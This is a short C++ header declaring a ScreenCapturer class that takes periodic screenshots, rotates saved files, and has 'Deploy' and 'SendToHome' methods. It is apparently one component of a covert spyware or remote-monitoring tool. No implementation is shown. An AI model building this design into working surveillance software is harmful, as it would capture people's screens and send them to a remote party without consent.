#ifndef _SCREEN_CAPTURER_H_
#define _SCREEN_CAPTURER_H_

#include "IPogan.h"

class ScreenCapturer : public IPogan
{
private:
	float delay; // Delay between screenshots
	size_t max_screenshots; // Maximum screenshots to save
	size_t screenshot_count;
	size_t last_deleted;
	std::string log_dir;

public:
	ScreenCapturer(std::string log_dir, float delay = 10, size_t max_screenshots = 3);

	virtual void CaptureScreen();

	virtual void CleanUp();

	virtual void Deploy();

	virtual void SendToHome();
};

#endif
